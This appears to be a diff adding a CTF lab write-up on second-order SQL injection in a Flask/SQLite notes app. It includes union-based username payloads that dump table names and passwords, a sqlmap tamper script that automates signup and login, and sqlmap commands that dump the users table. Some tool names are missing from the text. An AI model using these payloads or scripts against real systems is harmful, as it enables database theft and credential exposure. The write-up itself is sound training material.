@@ -145,6 +145,191 @@ The passwords can also be retrieved by decoding the Flask session cookie:
 
 }
 
+####
+#### Goal
+
+Here, the previous vulnerabilities have been fixed, and the login form is no longer vulnerable to injection. The team has added a new note function, allowing users to add notes on their page. The goal of this challenge is to find the vulnerability and dump the database to find the flag.  
+
+### Description
+
+By registering a new account and logging in to the application, the user can navigate to the new note function by clicking "Notes" in the top left menu. Here, it is possible to add new notes, and all the user's notes are listed on the bottom of the page, as seen here:
+
+![](https://assets.tryhackme.com/additional/imgur/Rhqnlaa.png)
+
+The notes function is not directly vulnerable, as the function to insert notes is safe because it uses parameterized queries. With parameterized queries, the statement is specified first with placeholders (?) for the parameters. Then the user input is passed into each parameter of the query later. Parameterized queries allow the database to distinguish between code and data, regardless of the input.
+
+INSERT INTO notes (username, title, note) VALUES (?, ?, ?)
+
+Even though parameterized queries are used, the server will accept malicious data and place it in the database if the application does not sanitize it. Still, the parameterized query prevents the input from leading to injection. Since the application might accept malicious data, all queries must use parameterized queries, and not only for queries directly accepting user input.
+
+The user registration function also utilizes parameterized queries, so when the query below is executed, only the INSERT statement gets executed. It will accept any malicious input and place it in the database if it doesn't sanitize it, but the parameterized query prevents the input from leading to injection.
+
+INSERT INTO users (username, password) VALUES (?, ?)
+
+However, the query that fetches all of the notes belonging to a user does not use parameterized queries. The username is concatenated directly into the query, making it vulnerable to injection.
+
+SELECT title, note FROM notes WHERE username = '" + username + "'
+
+This means that if we register a user with a malicious name, everything will be fine until the user navigates to the notes page and the unsafe query tries to fetch the data for the malicious user.
+
+By creating a user with the following name:
+
+' union select 1,2'
+
+We should be able to trigger the secondary injection:
+
+![](https://assets.tryhackme.com/additional/imgur/MVYEVCi.png)
+
+With this username, the application performs the following query:  
+
+SELECT title, note FROM notes WHERE username = '' union select 1,2''
+
+Then on the notes page as the new user, we can see that the first column in the query is the note title, and the second column is the note itself:
+
+![](https://assets.tryhackme.com/additional/imgur/G3h1bOc.png)
+
+With this knowledge, this is rather easy to exploit. For example, to get all the tables from the database, we can create a user with the name:  
+
+' union select 1,group_concat(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%''
+
+To find the flag among the passwords, register a user with the name:
+
+'  union select 1,group_concat(password) from users'
+
+##### Automating Exploitation Using  
+
+It is possible to use to automate this attack, but a standard attack with will fail. The injection happens at the user registration, but the vulnerable function is located on the notes page. For to exploit this vulnerability, it must do the following steps:
+
+1. Register a malicious user
+2. Login with the malicious user
+3. Go to the notes page to trigger the injection
+
+It is possible to achieve all of the necessary steps by creating a tamper script. supports tamper scripts, which are scripts used for tampering with injection data. With a tamper script, we can easily modify the payload, for example, adding a custom encoding to it. It also allows us to set other things, such as cookies. 
+
+There are two custom functions in the tamper script below. The first function is _create_account()_, which register a user with 's payload as name and 'asd' as password. The next custom function is _login()_, which logs in as the newly created user and returns the Flask session cookie. _tamper()_ is the main function in the script, and it has the _payload_ and _**kwargs_ as arguments. _**kwargs_ holds information such as the headers, which we need to place the Flask session cookie onto the request to allow to go to the notes page to trigger the injection. The _tamper()_ function first gets the headers from _kwargs_, then creates a new user on the application, and then it logs in to the application and sets the Flask session onto the header object.  
+
+#!/usr/bin/python
+
+import requests
+
+from lib.core.enums import PRIORITY
+
+__priority__ = PRIORITY.NORMAL
+
+  
+
+address = "://10.10.1.134:5000/challenge4"
+
+password = "asd"
+
+  
+
+def dependencies():
+
+    pass
+
+  
+
+def create_account(payload):
+
+    with requests.Session() as s:
+
+        data = {"username": payload, "password": password}
+
+        resp = s.post(f"{address}/signup", data=data)
+
+  
+
+def login(payload):
+
+    with requests.Session() as s:
+
+        data = {"username": payload, "password": password}
+
+        resp = s.post(f"{address}/login", data=data)
+
+        sessid = s.cookies.get("session", None)
+
+    return "session={}".format(sessid)
+
+  
+  
+
+def tamper(payload, **kwargs):
+
+    headers = kwargs.get("headers", {})
+
+    create_account(payload)
+
+    headers["Cookie"] = login(payload)
+
+    return payload
+
+  
+  
+
+The folder where the tamper script is located will also need an empty ___init__.py_  file for to be able to load it. Before starting with the tamper script, change the address and password variable inside the script. With this done, it is possible to exploit the vulnerability with the following command:
+
+ --tamper so-tamper.py --url ://10.10.1.134:5000/challenge4/signup  --data "username=admin&password=asd" 
+
+--second-url ://10.10.1.134:5000/challenge4/notes  -p username --dbms sqlite --technique=U --no-cast
+
+  
+
+# --tamper so-tamper.py - The tamper script
+
+# --url - The URL of the injection point, which is /signup in this case
+
+# --data - The POST data from the registraion form to /signup. 
+
+#   Password must be the same as the password in the tamper script
+
+# --second-url ://10.10.1.134:5000/challenge4/notes - Visit this URL to check for results
+
+# -p username - The parameter to inject to
+
+# --dbms sqlite - To speed things up
+
+# --technique=U - The technique to use. [U]nion-based
+
+# --no-cast - Turn off payload casting mechanism
+
+Dumping the _users_ table might be hard without turning off the payload casting mechanism with the _--no-cast_ parameter. An example of the difference between casting and no casting can be seen here:
+
+-- With casting enabled:
+
+admin' union all select min(cast(x'717a717071' as text)||coalesce(cast( as text),cast(x'20' as text)))||cast(x'716b786271' as text),null from sqlite_master 
+
+where tbl_name=cast(x'7573657273' as text)-- daqo'
+
+-- 7573657273 is 'users' in ascii
+
+  
+
+-- Without casting:
+
+admin' union all select cast(x'717a6a7871' as text)||id||cast(x'6774697a7462' as text)||password||cast(x'6774697a7462' as text)||username||cast(x'7162706b71' as text),null 
+
+from users-- ypfr'
+
+When asks, answer no to follow 302 redirects, then answer yes to continue further testing if it detects some WAF/. Answer no when asked if you want to merge cookies in future requests, and say no to reduce the number of requests. As seen in the image below, was able to find the vulnerability, which allows us to automate the exploitation of it.
+
+![](https://assets.tryhackme.com/additional/imgur/ernTceT.png)
+
+The flag can then be found by dumping the _users_ table:  
+
+ --tamper tamper/so-tamper.py --url ://10.10.1.134:5000/challenge4/signup --data "username=admin&password=asd" 
+
+--second-url ://10.10.1.134:5000/challenge4/notes -p username --dbms=sqlite --technique=U --no-cast -T users --dump
+
+is quite noisy and will add a lot of users attempting to exploit this application. Because of this, the output will be trimmed and the message below can be seen.
+
+[WARNING] console output will be trimmed to last 256 rows due to large table size
+
+However, all the data is saved and written to a dump file, as seen in the image below. Read the top of the dump file to get the flag:
+
+![](https://assets.tryhackme.com/additional/imgur/9DSH7Aq.png)
+
 #### **BLIND SQL INJECTION**
 
 This challenge has the same vulnerability as the previous one. However, it is no longer possible to extract data from the Flask session cookie or via the username display. The login form still has the same vulnerability, but this time the goal is to abuse the login form with blind injection to extract the admin's password.
@@ -232,4 +417,5 @@ $  sqlmap -u ://10.49.141.158:5000/challenge3/login --data="username=admin&p
 --level=5 --risk=3 --dbms=sqlite --technique=b --dump
 
 ![](https://assets.tryhackme.com/additional/imgur/Zd65ZQP.png)  
+
 
